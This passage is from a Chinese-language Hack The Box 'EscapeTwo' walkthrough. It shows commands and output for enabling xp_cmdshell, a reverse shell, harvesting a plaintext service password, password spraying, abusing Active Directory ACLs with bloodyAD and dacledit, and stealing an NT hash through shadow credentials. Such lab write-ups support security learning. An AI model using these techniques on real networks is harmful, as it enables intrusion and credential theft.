<span class="hljs-built_in">Old</span> <span class="hljs-keyword">Value</span>: , <span class="hljs-built_in">New</span> <span class="hljs-keyword">Value</span>: us_english<br>[*] ENVCHANGE(PACKETSIZE): <span class="hljs-built_in">Old</span> <span class="hljs-keyword">Value</span>: <span class="hljs-number">4096</span>, <span class="hljs-built_in">New</span> <span class="hljs-keyword">Value</span>: <span class="hljs-number">16192</span><br>[*] <span class="hljs-keyword">INFO</span>(DC01\SQLEXPRESS): <span class="hljs-type">Line</span> <span class="hljs-number">1</span>: Changed <span class="hljs-keyword">database</span> context <span class="hljs-keyword">to</span> <span class="hljs-string">&#x27;master&#x27;</span>.<br>[*] <span class="hljs-keyword">INFO</span>(DC01\SQLEXPRESS): <span class="hljs-type">Line</span> <span class="hljs-number">1</span>: Changed <span class="hljs-keyword">language</span> setting <span class="hljs-keyword">to</span> us_english.<br>[*] ACK: Result: <span class="hljs-number">1</span> - Microsoft <span class="hljs-keyword">SQL</span> <span class="hljs-keyword">Server</span> <span class="hljs-number">2019</span> RTM (<span class="hljs-number">15.0</span><span class="hljs-number">.2000</span>)<br>[!] Press help <span class="hljs-keyword">for</span> extra shell commands<br><span class="hljs-keyword">SQL</span> (sa  dbo@master)&gt; whoami<br>ERROR(DC01\SQLEXPRESS): <span class="hljs-type">Line</span> <span class="hljs-number">1</span>: Could <span class="hljs-keyword">not</span> find stored <span class="hljs-keyword">procedure</span> <span class="hljs-string">&#x27;whoami&#x27;</span>.<br><span class="hljs-keyword">SQL</span> (sa  dbo@master)&gt; EXEC sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>, <span class="hljs-number">1</span>;<br><span class="hljs-keyword">INFO</span>(DC01\SQLEXPRESS): <span class="hljs-type">Line</span> <span class="hljs-number">185</span>: <span class="hljs-keyword">Configuration</span> <span class="hljs-keyword">option</span> <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span> changed <span class="hljs-keyword">from</span> <span class="hljs-number">0</span> <span class="hljs-keyword">to</span> <span class="hljs-number">1.</span> Run the RECONFIGURE <span class="hljs-keyword">statement</span> <span class="hljs-keyword">to</span> install.<br><span class="hljs-keyword">SQL</span> (sa  dbo@master)&gt; RECONFIGURE;<br><span class="hljs-keyword">SQL</span> (sa  dbo@master)&gt; whoami<br>ERROR(DC01\SQLEXPRESS): <span class="hljs-type">Line</span> <span class="hljs-number">1</span>: Could <span class="hljs-keyword">not</span> find stored <span class="hljs-keyword">procedure</span> <span class="hljs-string">&#x27;whoami&#x27;</span>.<br><span class="hljs-keyword">SQL</span> (sa  dbo@master)&gt; EXEC sp_configure <span class="hljs-string">&#x27;xp_cmdshell&#x27;</span>;<br><span class="hljs-type">name</span>          minimum   maximum   config_value   run_value   <br><span class="hljs-comment">-----------   -------   -------   ------------   ---------   </span><br>xp_cmdshell         <span class="hljs-number">0</span>         <span class="hljs-number">1</span>              <span class="hljs-number">1</span>           <span class="hljs-number">1</span>   <br><span class="hljs-keyword">SQL</span> (sa  dbo@master)&gt; <br><span class="hljs-keyword">SQL</span> (sa  dbo@master)&gt; <span class="hljs-keyword">SELECT</span> DB_NAME() <span class="hljs-keyword">AS</span> CurrentDatabase;<br>CurrentDatabase   <br><span class="hljs-comment">---------------   </span><br>master          <br></code></pre></td></tr></table></figure>
+
+<p>使用mdut连接</p>
+<p><img src="/2026/01/21/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84windows%E7%94%9F%E6%B4%BB-EscapeTwo/vmware_yCR1ZCiAn2.png" srcset="/img/loading.gif" lazyload></p>
+<p><img src="/2026/01/21/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84windows%E7%94%9F%E6%B4%BB-EscapeTwo/vmware_u2uZYpS8CC.png" srcset="/img/loading.gif" lazyload></p>
+<p>之后反弹shell到我们的主机上</p>
+<figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs css">────────────────────────────────────────────────────────────────────────────────<br>➤  🏠 <span class="hljs-selector-tag">Main</span> <span class="hljs-selector-tag">Menu</span> (m) 💀 Payloads (<span class="hljs-selector-tag">p</span>) 🔄 <span class="hljs-attribute">Clear</span> (Ctrl-L) 🚫 Quit (<span class="hljs-selector-tag">q</span>/Ctrl-C)<br><span class="hljs-selector-attr">[+]</span> Got reverse shell <span class="hljs-selector-tag">from</span> DC01-<span class="hljs-number">10.129</span>.<span class="hljs-number">186.96</span>-Microsoft_Windows_Server_2019_Standard-x64-based_PC 😍 Assigned SessionID &lt;<span class="hljs-number">1</span>&gt;<br><span class="hljs-selector-attr">[+]</span> Added readline support...<br><span class="hljs-selector-attr">[+]</span> Interacting with session <span class="hljs-selector-attr">[1]</span>, Shell Type: Basic, Menu key: Ctrl-D <br>[+] Logging to /root/.penelope/DC01~<span class="hljs-number">10.129</span>.<span class="hljs-number">186.96</span>_Microsoft_Windows_Server_2019_Standard_x64-based_PC/<span class="hljs-number">2026</span>_01_21-<span class="hljs-number">01</span>_58_25-<span class="hljs-number">198</span>.log 📜<br>───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────<br>PS C:\Windows\system32&gt; whoami<br>sequel\sql_svc<br>PS C:\Windows\system32&gt; <br></code></pre></td></tr></table></figure>
+
+<p>之后搜集敏感数据。</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><code class="hljs routeros">PS C:\Windows\system32&gt; cd C:\SQL2019\<br>PS C:\SQL2019&gt; cd ExpressAdv_ENU<br>PS C:\SQL2019\ExpressAdv_ENU&gt; dir<br><br><br>    Directory: C:\SQL2019\ExpressAdv_ENU<br><br><br>Mode                LastWriteTime         Length Name                                                                  <br>----                -------------         ------ ----                                                                  <br>d-----         6/8/2024   3:07 PM                1033_ENU_LP                                                           <br>d-----         6/8/2024   3:07 PM                redist                                                                <br>d-----         6/8/2024   3:07 PM                resources                                                             <br>d-----         6/8/2024   3:07 PM                x64                                                                   <br>-a----        9/24/2019  10:03 PM             45 AUTORUN.INF                                                           <br>-a----        9/24/2019  10:03 PM            788 MEDIAINFO.XML                                                         <br>-a----         6/8/2024   3:07 PM             16 PackageId.dat                                                         <br>-a----        9/24/2019  10:03 PM         142944 SETUP.EXE                                                             <br>-a----        9/24/2019  10:03 PM            486 SETUP.EXE.CONFIG                                                      <br>-a----         6/8/2024   3:07 PM            717 sql-Configuration.INI                                                 <br>-a----        9/24/2019  10:03 PM         249448 SQLSETUPBOOTSTRAPPER.DLL                                              <br><br><br>PS C:\SQL2019\ExpressAdv_ENU&gt; cat sql-Configuration.INI<br>[OPTIONS]<br><span class="hljs-attribute">ACTION</span>=<span class="hljs-string">&quot;Install&quot;</span><br><span class="hljs-attribute">QUIET</span>=<span class="hljs-string">&quot;True&quot;</span><br><span class="hljs-attribute">FEATURES</span>=SQL<br><span class="hljs-attribute">INSTANCENAME</span>=<span class="hljs-string">&quot;SQLEXPRESS&quot;</span><br><span class="hljs-attribute">INSTANCEID</span>=<span class="hljs-string">&quot;SQLEXPRESS&quot;</span><br><span class="hljs-attribute">RSSVCACCOUNT</span>=<span class="hljs-string">&quot;NT Service\ReportServer<span class="hljs-variable">$SQLEXPRESS</span>&quot;</span><br><span class="hljs-attribute">AGTSVCACCOUNT</span>=<span class="hljs-string">&quot;NT AUTHORITY\NETWORK SERVICE&quot;</span><br><span class="hljs-attribute">AGTSVCSTARTUPTYPE</span>=<span class="hljs-string">&quot;Manual&quot;</span><br><span class="hljs-attribute">COMMFABRICPORT</span>=<span class="hljs-string">&quot;0&quot;</span><br><span class="hljs-attribute">COMMFABRICNETWORKLEVEL</span>=<span class="hljs-string">&quot;&quot;</span>0&quot;<br><span class="hljs-attribute">COMMFABRICENCRYPTION</span>=<span class="hljs-string">&quot;0&quot;</span><br><span class="hljs-attribute">MATRIXCMBRICKCOMMPORT</span>=<span class="hljs-string">&quot;0&quot;</span><br><span class="hljs-attribute">SQLSVCSTARTUPTYPE</span>=<span class="hljs-string">&quot;Automatic&quot;</span><br><span class="hljs-attribute">FILESTREAMLEVEL</span>=<span class="hljs-string">&quot;0&quot;</span><br><span class="hljs-attribute">ENABLERANU</span>=<span class="hljs-string">&quot;False&quot;</span> <br><span class="hljs-attribute">SQLCOLLATION</span>=<span class="hljs-string">&quot;SQL_Latin1_General_CP1_CI_AS&quot;</span><br><span class="hljs-attribute">SQLSVCACCOUNT</span>=<span class="hljs-string">&quot;SEQUEL\sql_svc&quot;</span><br><span class="hljs-attribute">SQLSVCPASSWORD</span>=<span class="hljs-string">&quot;WqSZAF6CysDQbGb3&quot;</span><br><span class="hljs-attribute">SQLSYSADMINACCOUNTS</span>=<span class="hljs-string">&quot;SEQUEL\Administrator&quot;</span><br><span class="hljs-attribute">SECURITYMODE</span>=<span class="hljs-string">&quot;SQL&quot;</span><br><span class="hljs-attribute">SAPWD</span>=<span class="hljs-string">&quot;MSSQLP@ssw0rd!&quot;</span><br><span class="hljs-attribute">ADDCURRENTUSERASSQLADMIN</span>=<span class="hljs-string">&quot;False&quot;</span><br><span class="hljs-attribute">TCPENABLED</span>=<span class="hljs-string">&quot;1&quot;</span><br><span class="hljs-attribute">NPENABLED</span>=<span class="hljs-string">&quot;1&quot;</span><br><span class="hljs-attribute">BROWSERSVCSTARTUPTYPE</span>=<span class="hljs-string">&quot;Automatic&quot;</span><br><span class="hljs-attribute">IAcceptSQLServerLicenseTerms</span>=<span class="hljs-literal">True</span><br>PS C:\SQL2019\ExpressAdv_ENU&gt; <br></code></pre></td></tr></table></figure>
+
+<p>发现了一段密码。</p>
+<p>密码喷洒后，发现使用这个密码可以登录ryan的账户，还有winrm权限。</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# nxc winrm <span class="hljs-number">10.129</span><span class="hljs-number">.186</span><span class="hljs-number">.96</span> -u <span class="hljs-string">&#x27;ryan&#x27;</span> -p <span class="hljs-string">&#x27;WqSZAF6CysDQbGb3&#x27;</span> <br>[*] Initializing MSSQL protocol <span class="hljs-keyword">database</span><br>WINRM       <span class="hljs-number">10.129</span><span class="hljs-number">.186</span><span class="hljs-number">.96</span>   <span class="hljs-number">5985</span>   DC01             [*] Windows <span class="hljs-number">10</span> / <span class="hljs-keyword">Server</span> <span class="hljs-number">2019</span> Build <span class="hljs-number">17763</span> (<span class="hljs-type">name</span>:DC01) (<span class="hljs-keyword">domain</span>:sequel.htb) <br>/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:<span class="hljs-number">46</span>: CryptographyDeprecationWarning: ARC4 has been moved <span class="hljs-keyword">to</span> cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 <span class="hljs-keyword">and</span> will be removed <span class="hljs-keyword">from</span> cryptography.hazmat.primitives.ciphers.algorithms <span class="hljs-keyword">in</span> <span class="hljs-number">48.0</span><span class="hljs-number">.0</span>.<br>  arc4 = algorithms.ARC4(self._key)<br>WINRM       <span class="hljs-number">10.129</span><span class="hljs-number">.186</span><span class="hljs-number">.96</span>   <span class="hljs-number">5985</span>   DC01             [+] sequel.htb\ryan:WqSZAF6CysDQbGb3 (Pwn3d!)<br></code></pre></td></tr></table></figure>
+
+<figure class="highlight moonscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs moonscript">*Evil-WinRM* PS <span class="hljs-name">C</span>:\Users\ryan\Desktop&gt; <span class="hljs-built_in">type</span> user.txt<br><span class="hljs-number">64</span>d73a79bf4dcff891c4564ca29a1a46<br>*Evil-WinRM* PS <span class="hljs-name">C</span>:\Users\ryan\Desktop&gt; <br>*Evil-WinRM* PS <span class="hljs-name">C</span>:\Users\ryan\Desktop&gt; <br></code></pre></td></tr></table></figure>
+
+<p>上传sharphound收集信息并下载。</p>
+<figure class="highlight subunit"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs subunit">*Evil-WinRM* PS C:\Users\ryan\Desktop&gt; upload SharpHound.exe<br>                                        <br>Info: Uploading /home/kali/Desktop/SharpHound.exe to C:\Users\ryan\Desktop\SharpHound.exe<br>                                        <br>Data: 1713492 bytes of 1713492 bytes copied<br>                                        <br>Info: Upload successful!<br>*Evil-WinRM* PS C:\Users\ryan\Desktop&gt; .\SharpHound.exe -c All<br>2026<span class="hljs-string">-01</span><span class="hljs-string">-20</span>T23:07:52.0226894<span class="hljs-string">-08</span>:00|INFORMATION|This version of SharpHound is compatible with the 5.0.0 Release of BloodHound<br>2026<span class="hljs-string">-01</span><span class="hljs-string">-20</span>T23:07:52.2258431<span class="hljs-string">-08</span>:00|INFORMATION|Resolved Collection Methods: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices, LdapServices, WebClientService, SmbInfo, NTLMRegistry<br>2026<span class="hljs-string">-01</span><span class="hljs-string">-20</span>T23:07:52.2414344<span class="hljs-string">-08</span>:00|INFORMATION|Initializing SharpHound at 11:07 PM on 1/20/2026<br>2026<span class="hljs-string">-01</span><span class="hljs-string">-20</span>T23:07:52.2883092<span class="hljs-string">-08</span>:00|INFORMATION|Resolved current domain to sequel.htb<br>2026<span class="hljs-string">-01</span><span class="hljs-string">-20</span>T23:07:52.4289377<span class="hljs-string">-08</span>:00|INFORMATION|Flags: Group, LocalAdmin, GPOLocalGroup, Session, LoggedOn, Trusts, ACL, Container, RDP, ObjectProps, DCOM, SPNTargets, PSRemote, UserRights, CARegistry, DCRegistry, CertServices, LdapServices, WebClientService, SmbInfo, NTLMRegistry<br>2026<span class="hljs-string">-01</span><span class="hljs-string">-20</span>T23:07:52.5227121<span class="hljs-string">-08</span>:00|INFORMATION|Beginning LDAP search for sequel.htb<br>2026<span class="hljs-string">-01</span><span class="hljs-string">-20</span>T23:07:52.6164364<span class="hljs-string">-08</span>:00|INFORMATION|Beginning LDAP search for sequel.htb Configuration NC<br>2026<span class="hljs-string">-01</span><span class="hljs-string">-20</span>T23:07:52.6476894<span class="hljs-string">-08</span>:00|INFORMATION|Producer has finished, closing LDAP channel<br>2026<span class="hljs-string">-01</span><span class="hljs-string">-20</span>T23:07:52.6476894<span class="hljs-string">-08</span>:00|INFORMATION|LDAP channel closed, waiting for consumers<br>2026<span class="hljs-string">-01</span><span class="hljs-string">-20</span>T23:07:52.6633111<span class="hljs-string">-08</span>:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for SEQUEL.HTB<br>2026<span class="hljs-string">-01</span><span class="hljs-string">-20</span>T23:07:52.6633111<span class="hljs-string">-08</span>:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for SEQUEL.HTB<br>2026<span class="hljs-string">-01</span><span class="hljs-string">-20</span>T23:07:53.0070972<span class="hljs-string">-08</span>:00|INFORMATION|[CommonLib ACLProc]Building GUID Cache for SEQUEL.HTB<br>2026<span class="hljs-string">-01</span><span class="hljs-string">-20</span>T23:08:00.3351926<span class="hljs-string">-08</span>:00|INFORMATION|Consumers finished, closing output channel<br>Closing writers<br>2026<span class="hljs-string">-01</span><span class="hljs-string">-20</span>T23:08:00.3664322<span class="hljs-string">-08</span>:00|INFORMATION|Output channel closed, waiting for output task to complete<br>2026<span class="hljs-string">-01</span><span class="hljs-string">-20</span>T23:08:00.6321599<span class="hljs-string">-08</span>:00|INFORMATION|Status: 348 objects finished (<span class="hljs-string">+348</span> 43.5)/s -- Using 41 MB RAM<br>2026<span class="hljs-string">-01</span><span class="hljs-string">-20</span>T23:08:00.6321599<span class="hljs-string">-08</span>:00|INFORMATION|Enumeration finished in 00:00:08.1214295<br>2026<span class="hljs-string">-01</span><span class="hljs-string">-20</span>T23:08:00.8682785<span class="hljs-string">-08</span>:00|INFORMATION|Saving cache with stats: 18 ID to type mappings.<br> 1 name to SID mappings.<br> 1 machine sid mappings.<br> 4 sid to domain mappings.<br> 0 global catalog mappings.<br>2026<span class="hljs-string">-01</span><span class="hljs-string">-20</span>T23:08:00.8978829<span class="hljs-string">-08</span>:00|INFORMATION|SharpHound Enumeration Completed at 11:08 PM on 1/20/2026! Happy Graphing!<br>*Evil-WinRM* PS C:\Users\ryan\Desktop&gt; <br></code></pre></td></tr></table></figure>
+
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livescript">*Evil-WinRM* PS C:<span class="hljs-string">\Users\ryan\Desktop&gt;</span> download <span class="hljs-number">20260120230753_</span>BloodHound.zip<br>                                        <br>Info: Downloading C:<span class="hljs-string">\Users\ryan\Desktop\20260120230753_BloodHound.zip</span> <span class="hljs-keyword">to</span> <span class="hljs-number">20260120230753_</span>BloodHound.zip<br>                                        <br>Info: Download successful!<br>*Evil-WinRM* PS C:<span class="hljs-string">\Users\ryan\Desktop&gt;</span> <br></code></pre></td></tr></table></figure>
+
+<p>使用bloodhound分析信息，发现ryan对ca_svc有writeowner权限</p>
+<p><img src="/2026/01/21/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84windows%E7%94%9F%E6%B4%BB-EscapeTwo/vmware_N5wrOJ1PhI.png" srcset="/img/loading.gif" lazyload></p>
+<p>并且ca_svc是证书发布者。</p>
+<p><img src="/2026/01/21/%E4%BB%8E%E9%9B%B6%E5%BC%80%E5%A7%8B%E7%9A%84windows%E7%94%9F%E6%B4%BB-EscapeTwo/vmware_zi0757mMek.png" srcset="/img/loading.gif" lazyload></p>
+<p>那么整个的攻击链就是ryan——ca_svc——恶意证书发布——域控。</p>
+<p><strong>ryan</strong> 对用户 <strong>ca_svc</strong> 拥有 <code>WriteOwner</code> 权限 。</p>
+<p><strong>ca_svc</strong> 是 <strong>Cert Publishers</strong> 组的成员 。</p>
+<p><strong>Cert Publishers</strong> 组对 <strong>DunderMifflinAuthentication</strong> 证书模板拥有写权限 。</p>
+<p>利用该模板进行 <strong>AD CS ESC4</strong> 攻击提权。</p>
+<p>先拿到ca再说。</p>
+<p>既然拥有writeowner权限，那么可以将ca_svc所有权改为自己</p>
+<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# # 语法：bloodyAD --host &lt;DC_IP&gt; -d &lt;域名&gt; -u ryan -p &lt;密码&gt; <span class="hljs-keyword">set</span> owner &lt;目标用户&gt; &lt;新所有者&gt;<br>bloodyAD --host <span class="hljs-number">10.129</span>.<span class="hljs-number">186.96</span> -d sequel.htb -u ryan -p <span class="hljs-string">&#x27;WqSZAF6CysDQbGb3&#x27;</span> <span class="hljs-keyword">set</span> owner ca_svc ryan<br>[+] <span class="hljs-keyword">Old</span> owner S-<span class="hljs-number">1</span>-<span class="hljs-number">5</span>-<span class="hljs-number">21</span>-<span class="hljs-number">548670397</span>-<span class="hljs-number">972687484</span>-<span class="hljs-number">3496335370</span>-<span class="hljs-number">512</span> <span class="hljs-keyword">is</span> now replaced <span class="hljs-keyword">by</span> ryan <span class="hljs-keyword">on</span> ca_svc<br></code></pre></td></tr></table></figure>
+
+<p>然后修改ACL，给自己GenericAll权限。</p>
+<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs oxygene">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# bloodyAD --host <span class="hljs-number">10.129</span>.<span class="hljs-number">186.96</span> -d sequel.htb -u ryan -p <span class="hljs-string">&#x27;WqSZAF6CysDQbGb3&#x27;</span> <span class="hljs-keyword">add</span> genericAll ca_svc ryan<br>[+] ryan <span class="hljs-keyword">has</span> now GenericAll <span class="hljs-keyword">on</span> ca_svc<br></code></pre></td></tr></table></figure>
+
+<p>或者这样也可以</p>
+<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs prolog">┌──(root㉿kaada)-[/home/kali/<span class="hljs-symbol">Desktop</span>]<br>└─# impacket-dacledit  -action <span class="hljs-string">&#x27;write&#x27;</span> -rights <span class="hljs-string">&#x27;FullControl&#x27;</span> -principal <span class="hljs-string">&#x27;ryan&#x27;</span> -target <span class="hljs-string">&#x27;ca_svc&#x27;</span> <span class="hljs-string">&#x27;sequel.htb&#x27;</span>/<span class="hljs-string">&quot;ryan&quot;</span>:<span class="hljs-string">&quot;WqSZAF6CysDQbGb3&quot;</span><br><span class="hljs-symbol">Impacket</span> v0<span class="hljs-number">.14</span><span class="hljs-number">.0</span>.dev0 - <span class="hljs-symbol">Copyright</span> <span class="hljs-symbol">Fortra</span>, <span class="hljs-symbol">LLC</span> and its affiliated companies <br><br>[*] <span class="hljs-symbol">DACL</span> backed up to dacledit<span class="hljs-number">-20260121</span><span class="hljs-number">-024829.</span>bak<br>[*] <span class="hljs-symbol">DACL</span> modified successfully!<br></code></pre></td></tr></table></figure>
+
+<h3 id="核心原理深度剖析-DAC-自主访问控制"><a href="#核心原理深度剖析-DAC-自主访问控制" class="headerlink" title="[核心原理深度剖析] DAC 自主访问控制"></a>[核心原理深度剖析] DAC 自主访问控制</h3><blockquote>
+<p><strong>DACL 与 Owner 机制</strong>：Windows 的安全对象包含一个 <strong>DACL (Discretionary Access Control List)</strong>。 <strong>提权逻辑</strong>：操作系统规定，<strong>对象的所有者 (Owner) 永远有权修改该对象的 DACL</strong> (<code>WRITE_DAC</code>)。 <strong>攻击链</strong>：拥有 <code>WriteOwner</code> -&gt; 修改 Owner 为自己 -&gt; 此时拥有修改 ACL 的权利 -&gt; 给自己添加 <code>GenericAll</code> (Full Control) -&gt; 彻底控制目标对象。</p>
+</blockquote>
+<p>之后本来想配置影子凭据获取ca_svc的哈希的但是一直报错，只能改密码了。</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs routeros">┌──(root㉿kaada)-[/home/kali/Desktop]<br>└─# certipy-ad shadow auto -u <span class="hljs-string">&#x27;ryan@sequel.htb&#x27;</span> -p <span class="hljs-string">&quot;WqSZAF6CysDQbGb3&quot;</span> -account <span class="hljs-string">&#x27;ca_svc&#x27;</span> -dc-ip <span class="hljs-string">&#x27;10.129.186.96&#x27;</span><br>Certipy v5.0.4 - by Oliver Lyak (ly4k)<br><br>[-] Got error: socket<span class="hljs-built_in"> connection </span><span class="hljs-built_in">error</span> <span class="hljs-keyword">while</span> opening: timed out<br>[-] Use -<span class="hljs-built_in">debug</span> <span class="hljs-keyword">to</span> <span class="hljs-built_in">print</span> a stacktrace<br><br></code></pre></td></tr></table></figure>
+
+<p>但是重置靶机之后又好了。</p>
+<figure class="highlight prolog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs prolog">┌──(root㉿kaada)-[/home/kali/<span class="hljs-symbol">Desktop</span>]<br>└─#  certipy shadow auto -u ryan@sequel.htb -p <span class="hljs-symbol">WqSZAF6CysDQbGb3</span> -account <span class="hljs-string">&#x27;ca_svc&#x27;</span> -dc-ip <span class="hljs-number">10.129</span><span class="hljs-number">.186</span><span class="hljs-number">.117</span><br><span class="hljs-symbol">Certipy</span> v4<span class="hljs-number">.8</span><span class="hljs-number">.2</span> - by <span class="hljs-symbol">Oliver</span> <span class="hljs-symbol">Lyak</span> (ly4k)<br><br>[*] <span class="hljs-symbol">Targeting</span> user <span class="hljs-string">&#x27;ca_svc&#x27;</span><br>[*] <span class="hljs-symbol">Generating</span> certificate<br>[*] <span class="hljs-symbol">Certificate</span> generated<br>[*] <span class="hljs-symbol">Generating</span> <span class="hljs-symbol">Key</span> <span class="hljs-symbol">Credential</span><br>[*] <span class="hljs-symbol">Key</span> <span class="hljs-symbol">Credential</span> generated with <span class="hljs-symbol">DeviceID</span> <span class="hljs-string">&#x27;ac8531c5-99b8-8310-0b81-bb01fd9ff206&#x27;</span><br>[*] <span class="hljs-symbol">Adding</span> <span class="hljs-symbol">Key</span> <span class="hljs-symbol">Credential</span> with device <span class="hljs-symbol">ID</span> <span class="hljs-string">&#x27;ac8531c5-99b8-8310-0b81-bb01fd9ff206&#x27;</span> to the <span class="hljs-symbol">Key</span> <span class="hljs-symbol">Credentials</span> for <span class="hljs-string">&#x27;ca_svc&#x27;</span><br>[*] <span class="hljs-symbol">Successfully</span> added <span class="hljs-symbol">Key</span> <span class="hljs-symbol">Credential</span> with device <span class="hljs-symbol">ID</span> <span class="hljs-string">&#x27;ac8531c5-99b8-8310-0b81-bb01fd9ff206&#x27;</span> to the <span class="hljs-symbol">Key</span> <span class="hljs-symbol">Credentials</span> for <span class="hljs-string">&#x27;ca_svc&#x27;</span><br>[*] <span class="hljs-symbol">Authenticating</span> as <span class="hljs-string">&#x27;ca_svc&#x27;</span> with the certificate<br>[*] <span class="hljs-symbol">Using</span> principal: ca_svc@sequel.htb<br>[*] <span class="hljs-symbol">Trying</span> to get <span class="hljs-symbol">TGT</span>...<br>[*] <span class="hljs-symbol">Got</span> <span class="hljs-symbol">TGT</span><br>[*] <span class="hljs-symbol">Saved</span> credential cache to <span class="hljs-string">&#x27;ca_svc.ccache&#x27;</span><br>[*] <span class="hljs-symbol">Trying</span> to retrieve <span class="hljs-symbol">NT</span> hash for <span class="hljs-string">&#x27;ca_svc&#x27;</span><br>[*] <span class="hljs-symbol">Restoring</span> the old <span class="hljs-symbol">Key</span> <span class="hljs-symbol">Credentials</span> for <span class="hljs-string">&#x27;ca_svc&#x27;</span><br>[*] <span class="hljs-symbol">Successfully</span> restored the old <span class="hljs-symbol">Key</span> <span class="hljs-symbol">Credentials</span> for <span class="hljs-string">&#x27;ca_svc&#x27;</span><br>[*] <span class="hljs-symbol">NT</span> hash for <span class="hljs-string">&#x27;ca_svc&#x27;</span>: <span class="hljs-number">3</span>b181b914e7a9d5508ea1e20bc2b7fce<br></code></pre></td></tr></table></figure>
+
+<h3 id="核心原理深度剖析-WHfB-与-msDS-KeyCredentialLink"><a href="#核心原理深度剖析-WHfB-与-msDS-KeyCredentialLink" class="headerlink" title="[核心原理深度剖析] WHfB 与 msDS-KeyCredentialLink"></a>[核心原理深度剖析] WHfB 与 msDS-KeyCredentialLink</h3><blockquote>
+<p><strong>Shadow Credentials 技术</strong>：利用了 <strong>Windows Hello for Business (WHfB)</strong> 的认证机制。 <strong>msDS-KeyCredentialLink</strong>：这是 AD 用户的一个属性，用于存储认证公钥。 <strong>攻击流程</strong>：</p>
+<ol>
